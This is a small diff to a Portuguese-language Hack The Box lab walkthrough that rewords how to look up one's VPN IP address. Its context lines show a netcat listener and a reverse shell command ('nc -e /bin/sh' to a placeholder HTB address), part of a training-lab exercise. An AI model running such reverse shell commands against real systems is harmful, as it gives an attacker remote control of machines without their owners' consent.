@@ -184,9 +184,7 @@ $ rlwarp nc -nvlp YYYY
 command > nc -e /bin/sh 10.10.XX.XX YYYY
 ```
 > XX é equivalente a seu ip na VPN do HTB. 
-Ele pode ser verificado por meio do comando:
-Windows: ipconfig
-Linux: ip addr
+Ele pode ser verificado por meio do comando para Windows: ipconfig ou para Linux: ip addr
 
 3. Verificar se existe python no host remoto
 
